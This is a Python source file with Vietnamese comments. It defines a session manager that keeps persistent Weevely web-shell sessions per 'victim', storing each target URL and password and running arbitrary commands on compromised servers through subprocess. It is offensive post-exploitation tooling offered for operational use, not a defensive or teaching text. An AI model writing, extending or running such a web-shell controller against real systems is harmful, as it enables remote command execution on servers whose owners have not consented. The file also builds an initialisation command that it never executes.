# apps/weevely/session_manager.py
import threading
import time
from collections import defaultdict
import subprocess

class WeevelySessionManager:
    def __init__(self):
        self.active_sessions = {}  # weevely_id -> session_info
        self.session_locks = defaultdict(threading.Lock)
        self.weevely_path = None
        
    def create_session(self, weevely_id, url, password):
        """Tạo persistent session cho một victim"""
        if weevely_id in self.active_sessions:
            return self.active_sessions[weevely_id]
            
        # Tạo session file để reuse
        session_file = f"/tmp/weevely_session_{weevely_id}.session"
        
        # Khởi tạo session
        init_cmd = [
            'python3', self.weevely_path, 'session', session_file,
            'system_info'  # Test command
        ]
        
        # Lưu session info
        session_info = {
            'url': url,
            'password': password,
            'session_file': session_file,
            'created_at': time.time(),
            'last_used': time.time(),
            'command_count': 0
        }
        
        self.active_sessions[weevely_id] = session_info
        return session_info
    
    def execute_command(self, weevely_id, command):
        """Thực thi command trên session có sẵn"""
        if weevely_id not in self.active_sessions:
            raise ValueError("Session not found")
            
        session = self.active_sessions[weevely_id]
        session_file = session['session_file']
        
        # Sử dụng session file thay vì tạo connection mới
        cmd = [
            'python3', self.weevely_path, 'session', session_file, command
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        session['last_used'] = time.time()
        session['command_count'] += 1
        
        return result